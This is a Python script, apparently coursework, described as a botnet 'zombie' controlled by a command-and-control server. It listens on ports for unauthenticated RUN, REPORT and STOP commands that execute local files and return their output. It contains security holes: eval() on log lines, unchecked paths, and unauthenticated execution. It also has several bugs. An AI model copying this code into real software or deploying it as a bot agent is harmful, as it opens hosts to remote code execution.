#!/usr/bin/python3

#####################################
# Zombie controlled by the          #
# command and control               #
#                                   #
#                                   #
# Preston Dickerson                 #
#                                   #
#####################################


# Function that buffers the request from the command and control

import json
from threading import Lock
from multiprocessing import Process, Manager
import subprocess
import os
import select
import socket
import sys

import psutil

def bufferRequest(connectionSocket):
    finalBuffer = ""
    # run the loop until no buffers are left or the carriage return new line character sequence is found
    while True:
        # Get 1024 bytes of information
        buffer = connectionSocket.recv(1024).decode()
        if not buffer:
            break
        finalBuffer += buffer
        if '\r\n\r\n' in finalBuffer:
            break  # Break the loop when the end of the request headers is reached
    
    return finalBuffer

def parseRequest(request):
    # Get each line for looking at the carriage return and the new line characters
    lines = request.split()
    method = ""
    file = ""
    try:
        # Check if there are enough lines to proceed
        if len(lines) > 0:
            # Get the method, path, and remaining parts
            method, file = lines[0], lines[1]
    except ValueError:
        method = None
        file = None

    return method, file
    
import json

def runFile(path, port, log_file="execution_log.txt"):
    # Use subprocess.run to capture the output of the script
    result = subprocess.run([path], capture_output=True, text=True)

    if result.returncode == 0:
        # Assuming you want to capture both stdout and stderr
        output = result.stdout + result.stderr

        # Log the execution information to a file in JSON format
        log_data = {
            "port": port,
            "path": path,
            "output": output,
        }

        with open(log_file, "r+") as log:
            log.flush()  # Ensure the buffer is flushed to the file
            lines = log.readlines()
            log.seek(0)

            # Write log data, overwriting if the same port and path are found
            found = False
            for line in lines:
                entry = json.loads(line)
                if entry["port"] == port and entry["path"] == path:
                    log.write(json.dumps(log_data) + "\n")
                    found = True
                else:
                    log.write(line)

            if not found:
                log.write(json.dumps(log_data) + "\n")



    
def handleRun(connectionSocket, path):
    # If the path exists and it is a file, go there
    if os.path.exists("./" + path) and os.path.isfile("./" + path):

        localAddress = connectionSocket.getsockname()
        port = localAddress[1]

        # Run the file in a new thread
        p = Process(target=runFile, args=("./" + path, port), name=f"{path}")
        p.start()
        
        # Fill out the response headers
        responseHeaders = [
            "OK",
        ]

        responseBody = "Script is successfully running"

        # Form the response with the response body
        response = "\r\n".join(responseHeaders) + "\r\n" + responseBody + "\r\n\r\n"

        # Send the Response
        connectionSocket.send(response.encode())
    # Send FAIL if file not found
    else:
        response = "FAIL\r\nFile not found\r\n\r\n"
        connectionSocket.send(response.encode())

    # Return the information about the running process to (possibly) cancel
    return p.pid, path, port

def handleReport(connectionSocket, path, logFile="execution_log.txt"):
    localAddress = connectionSocket.getsockname()
    port = localAddress[1]

    print(f"Port: {port}, Path: {'./' + path}")

    try:
        # Read the log file and parse each line as JSON
        with open(logFile, "r") as log:
            for line in log:
                logData = eval(line)
                if logData["port"] == port and logData["path"] == "./" + path:
                    responseHeaders = ["OK"]
                    responseBody = f"Result retrieved:\n{logData['output']}"
                    break
            else:
                responseHeaders = ["FAIL"]
                responseBody = "Results not found"
    except Exception as e:
        responseHeaders = ["FAIL"]
        responseBody = f"Error reading log file: {str(e)}"

    # Form the response with the response body
    response = "\r\n".join(responseHeaders) + "\r\n" + responseBody + "\r\n\r\n"

    # Send the Response
    connectionSocket.send(response.encode())

def handleStop(connectionSocket, path, runningProcesses):
    try:
        localAddress = connectionSocket.getsockname()
        port = localAddress[1]

        # Check if the entry exists in the dictionary with the specified path and port
        if (path, port) in runningProcesses:
            process_id = runningProcesses[(path, port)]

            try:
                # Terminate the process using the stored process ID
                process = psutil.Process(process_id)
                process.terminate()

                # Remove the entry from the dictionary
                del runningProcesses[(path, port)]

                response = "OK\r\nTerminated the running process\r\n\r\n"
            except psutil.NoSuchProcess:
                response = "FAIL\r\nProcess not found\r\n\r\n"
        else:
            response = "FAIL\r\nProcess never was running or isn't running\r\n\r\n"

        connectionSocket.send(response.encode())
    except BrokenPipeError:
        pass

    # Update the running processes dictionary to not include that entry
    return runningProcesses



        

# Runs a single thread response in the server
def runServerThread(connectionSocket, runningProcesses, DisconnectSignal):
    while True:
        # Buffer the request
        request = bufferRequest(connectionSocket)

        if request == "DISCONNECT\r\n\r\n":
            DisconnectSignal.set()

        if DisconnectSignal.is_set():
            print("Disconnect Signal Recieved")
            return

        # Parse the request
        method, file = parseRequest(request)

        if method == None or file == None:
            continue

        # If it is a GET request, send to handleGet
        if "RUN" in method:
            process, path, port = handleRun(connectionSocket, file)
            runningProcesses[(path, port)] = process
        # If it is a HEAD request, send to handleHead
        elif "REPORT" in method:
            handleReport(connectionSocket, file)
        elif "STOP" in method:
            runningProcesses = handleStop(connectionSocket, file, runningProcesses)

def main():
    # Get the command for what we are connecting to, throw an error if there is not command line argument
    if len(sys.argv) < 2:
        print("Please enter arguments like this: ./myserver.py <Port1> <Port2> <Port3>.")
        return
    
    # Setup the server sockets
    serverSockets = [socket.socket(socket.AF_INET, socket.SOCK_STREAM) for _ in range(len(sys.argv)-1)]
    for i, serverSocket in enumerate(serverSockets):
        # Get the server port
        serverPort = int(sys.argv[i+1])
        
        # Set the SO_REUSEADDR option to allow reuse of the address (Want this for after termination)
        serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Bind to the server port
        serverSocket.bind(('', serverPort))

        # Listen at that server port
        serverSocket.listen(3)
        print(f"Server is listening at Port {serverPort}")

    # Create an array to store the processes on each port
    processes = []

    # Create a manager to manage shared data
    manager = Manager()

    # Create a shared dictionary for running processes
    runningProcesses = manager.dict()

    # Create a disconnect event using the manager to handle all running processes
    DisconnectSignal = manager.Event()

    # Use select to keep track of all server sockets
    while True:
        read, _, _ = select.select(serverSockets, [], [], 5)  # '5' for non-blocking
        
        for s in read:
            connectionSocket, addr = s.accept()
                
            p = Process(target=runServerThread, args=(connectionSocket, runningProcesses, DisconnectSignal))
            p.start()

            processes.append(p)

            if DisconnectSignal == DisconnectSignal.is_set():
                print("Disconnect signal hit")
                return

            # Close the connection socket after the thread completes
            connectionSocket.close()         


main()